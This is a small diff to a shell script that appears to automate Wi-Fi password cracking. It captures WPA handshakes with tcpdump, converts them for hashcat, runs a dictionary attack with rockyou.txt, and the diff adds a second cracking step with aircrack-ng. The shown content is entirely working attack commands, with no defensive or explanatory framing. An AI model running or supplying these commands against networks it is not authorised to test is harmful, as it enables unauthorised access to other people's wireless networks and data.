@@ -29,7 +29,7 @@ sudo tcpdump "ether proto 0x888e and ether host $x" -I -U -vvv -i en0 -w handsha
 mergecap -a -F pcap -w handshakes/capture.cap handshakes/beacon.cap handshakes/handshake.cap
 
 #removing the default beacon and handshake .cap files
-rm -rf handshakes/handshake.cap handshakes/beacon.cap
+rm handshakes/handshake.cap handshakes/beacon.cap
 
 #changing the file so hashcat can read it
 cap2hccapx handshakes/capture.cap handshakes/capture.hccapx
@@ -43,3 +43,4 @@ printf '\33c\e[3J'
 #Show the password
 sudo hashcat/hashcat -m 2500 handshakes/capture.hccapx rockyou.txt --show
 
+aircrack-ng handshakes/capture.cap -w rockyou.txt
